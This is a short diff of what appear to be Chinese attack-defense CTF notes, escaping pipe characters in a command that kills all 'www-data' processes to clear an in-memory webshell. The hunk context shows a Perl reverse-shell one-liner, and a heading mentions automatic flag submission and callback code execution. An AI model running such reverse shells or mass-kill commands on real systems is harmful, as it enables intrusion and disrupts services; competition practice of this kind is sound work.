@@ -244,7 +244,7 @@ perl -e 'use Socket;$i="127.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getproto
 
 >  杀马，kill -9 -1 杀死所有子进程（杀死当前用户所有进程，有权限下慎用），也可以直接killall apache2。这种操作并不会kill掉apache主进程，因为内存马是Apache启动的一个子进程；
 >
-> ps -aux|grep 'www-data'|awk '{print $2}'|xargs kill -9
+> ps -aux\|grep 'www-data'\|awk '{print $2}'\|xargs kill -9
 
 1. 回送flag+自动提交flag+回连任意代码执行
 
